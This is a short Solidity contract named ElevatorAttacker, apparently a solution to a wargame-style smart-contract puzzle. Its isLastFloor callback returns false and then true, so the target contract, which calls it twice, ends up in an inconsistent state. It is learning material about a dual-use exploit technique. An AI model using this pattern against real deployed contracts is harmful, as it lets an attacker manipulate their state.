// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorAttacker {
    IElevator public target;
    uint256 private callCount;

    constructor(address _target) {
        target = IElevator(_target);
    }

    function attack(uint256 _floor) external {
        callCount = 0;
        target.goTo(_floor);
    }

    function isLastFloor(uint256) external returns (bool) {
        callCount++;
        return callCount == 2;
    }
}

